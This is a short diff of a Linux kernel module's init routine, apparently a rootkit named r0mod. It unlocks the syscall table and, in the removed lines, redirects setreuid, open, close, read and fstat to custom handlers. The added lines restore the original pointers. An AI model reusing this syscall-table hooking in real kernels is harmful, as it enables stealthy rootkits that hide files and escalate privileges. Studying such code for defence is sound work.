@@ -117,19 +117,19 @@ static int __init r0mod_init(void)
     make_rw((unsigned long)syscall_table);
 
     orig_setreuid = (void *)syscall_table[__NR_setreuid];
-    *(syscall_table + __NR_setreuid)= (unsigned long)new_setreuid;
+    *(syscall_table + __NR_setreuid)= (unsigned long)orig_setreuid;
 
     orig_open  = (void *)syscall_table[__NR_open];
-    *(syscall_table + __NR_open)    = (unsigned long)new_open;
+    *(syscall_table + __NR_open)    = (unsigned long)orig_open;
 
     orig_close = (void *)syscall_table[__NR_close];
-    *(syscall_table + __NR_close)   = (ssize_t)new_close;
+    *(syscall_table + __NR_close)   = (ssize_t)orig_close;
 
     orig_read  = (void *)syscall_table[__NR_read];
-    *(syscall_table + __NR_read)    = (unsigned long)new_read;
+    *(syscall_table + __NR_read)    = (unsigned long)orig_read;
 
     orig_fstat = (void *)syscall_table[__NR_fstat];
-    *(syscall_table + __NR_fstat)   = (unsigned long)new_fstat;
+    *(syscall_table + __NR_fstat)   = (unsigned long)orig_fstat;
 
     //write_cr0(read_cr0() | 0x10000);
     make_ro((unsigned long)syscall_table);
